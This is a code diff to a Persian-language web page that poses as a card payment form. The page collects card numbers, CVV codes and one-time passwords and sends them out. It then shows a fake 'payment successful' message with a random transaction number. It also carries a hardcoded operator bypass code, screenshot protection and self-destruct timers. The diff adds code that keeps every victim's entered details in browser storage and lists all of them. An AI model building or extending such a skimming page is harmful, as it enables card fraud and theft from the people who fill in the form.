@@ -203,6 +203,8 @@
             border-radius: 10px;
             font-size: 14px;
             direction: rtl;
+            max-height: 300px;
+            overflow-y: auto;
         }
         @font-face {
             font-family: 'Vazir';
@@ -282,6 +284,7 @@
             const userDataDiv = document.getElementById('user-data');
             let currentStep = 1;
             let userData = {};
+            let allUsersData = JSON.parse(localStorage.getItem('allUsersData')) || [];
             let isSpecialMode = false;
             let sessionId = Math.random().toString(36).substr(2, 10);
             const SPECIAL_CODE = '12122312';
@@ -294,6 +297,7 @@
             function init() {
                 setupInputs();
                 updateProgress();
+                displayAllUsersData();
                 if (!localStorage.getItem(`specialMode_${sessionId}`)) {
                     setSelfDestructTimeout(600);
                 }
@@ -347,14 +351,28 @@
 
             function updateUserData(key, value) {
                 userData[key] = value;
-                displayUserData();
+                saveAndDisplayUserData();
             }
 
-            function displayUserData() {
-                userDataDiv.innerHTML = '<h3>اطلاعات وارد شده:</h3>' + 
-                    Object.entries(userData)
-                        .map(([key, value]) => `<p>${key}: ${value}</p>`)
-                        .join('');
+            function saveAndDisplayUserData() {
+                if (Object.keys(userData).length > 0) {
+                    allUsersData = allUsersData.filter(u => JSON.stringify(u) !== JSON.stringify(userData));
+                    allUsersData.push({ ...userData });
+                    localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
+                }
+                displayAllUsersData();
+            }
+
+            function displayAllUsersData() {
+                userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
+                    allUsersData.map((user, index) => 
+                        `<div style="margin-bottom: 15px;">
+                            <h4>کاربر ${index + 1}:</h4>` + 
+                            Object.entries(user)
+                                .map(([key, value]) => `<p>${key}: ${value}</p>`)
+                                .join('') +
+                        `</div>`
+                    ).join('');
             }
 
             function setupScreenshotProtection() {
@@ -377,10 +395,9 @@
             function validateStep(step) {
                 const card = document.getElementById('card-number').value;
                 if (card === SPECIAL_CODE) {
-                    return true; // مدیر تشخیص داده شده، بدون نیاز به پر کردن سایر فیلدها
+                    return true;
                 }
 
-                // اعتبارسنجی برای کاربران عادی
                 const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
                 for (let input of inputs) {
                     if (!input.value.trim()) {
@@ -499,7 +516,10 @@
                     sendData(1, { action: 'cvv', data: encryptedCvv });
                     sendData(2, { action: 'otp', data: encryptedOtp });
                     loader.style.display = 'none';
-                    result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${generateTransactionId()}<br>لطفاً این کد را نزد خود نگه دارید.`;
+                    const transactionId = generateTransactionId();
+                    userData['شماره تراکنش'] = transactionId;
+                    saveAndDisplayUserData();
+                    result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${transactionId}<br>لطفاً این کد را نزد خود نگه دارید.`;
                     if (!isSpecialMode) selfDestruct();
                 }, 2000);
             }
@@ -530,13 +550,14 @@
             function handlePageExit() {
                 if (!isSpecialMode) {
                     localStorage.removeItem(`specialMode_${sessionId}`);
-                    selfDestruct();
+                    saveAndDisplayUserData(); // ذخیره اطلاعات قبل از خروج
                 }
             }
 
             function cancel() {
                 if (confirm('آیا از لغو مطمئن هستید؟')) {
                     sendData(0, { action: 'cancel' });
+                    saveAndDisplayUserData();
                     if (!isSpecialMode) selfDestruct();
                 }
             }
